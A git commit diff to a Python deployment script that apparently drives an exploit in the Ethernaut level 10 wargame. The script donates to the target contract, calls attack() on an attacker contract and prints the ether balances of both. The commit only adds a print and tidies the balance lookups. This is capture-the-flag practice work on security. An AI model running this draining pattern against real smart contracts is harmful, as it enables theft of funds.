50d141c97c4eb2d00eab20b72c0e696148eb5366
sarobinson2001 <sarobinson2011@gmail.com>
2023-09-23 12:13:58 +0100

    update 10-deploy_attack.py

--- scripts/10-deploy_attack.py
+++ scripts/10-deploy_attack.py
@@ -22,13 +22,12 @@ def main():
     target.donate(ETHERNAUT_INSTANCE, {"from": player, "value": AMOUNT})
 
     # call the attack() function, on my attack contract
+    print(f"Calling attack() from {attack} ")
     attack.attack({"from": player, "allow_revert": True, "gas_limit": GAS_LIMIT})
 
     #  check balance (in ether) of the target contract
-    current_balance_target = target.balance()
-    current_balance_attack = attack.balance()
-    eth_balance_target = web3.fromWei(current_balance_target, "ether")
-    eth_balance_attack = web3.fromWei(current_balance_attack, "ether")
+    eth_balance_target = web3.fromWei(target.balance(), "ether")
+    eth_balance_attack = web3.fromWei(attack.balance(), "ether")
 
     print(f"\nBalance of the target contract = {eth_balance_target} ether")
     print(f"\nBalance of the attack contract = {eth_balance_attack} ether\n")
